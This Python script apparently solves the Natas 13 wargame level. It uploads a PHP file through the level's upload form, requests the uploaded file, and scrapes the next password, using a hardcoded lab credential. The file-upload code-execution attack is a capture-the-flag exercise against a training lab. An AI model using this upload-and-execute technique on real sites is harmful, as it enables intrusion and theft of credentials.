#!/usr/local/bin/python3
import requests
import re

username = "natas13"
password = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'

url = 'http://%s.natas.labs.overthewire.org' % username

data = {"filename": "natas13.php", "submit": "Upload file"}
files = {"uploadedfile": open('natas13.php', 'rb')}

response = requests.post(url, auth=(username, password), data=data, files=files)
content = response.text

filename = re.findall('The file <a href="(.*)">upload', content)[0]

##############################################################################

url = 'http://%s.natas.labs.overthewire.org/%s' % (username, filename)

response = requests.get(url, auth=(username, password))
content = response.text

# print(content)
print(re.findall('password(.*)', content)[0])
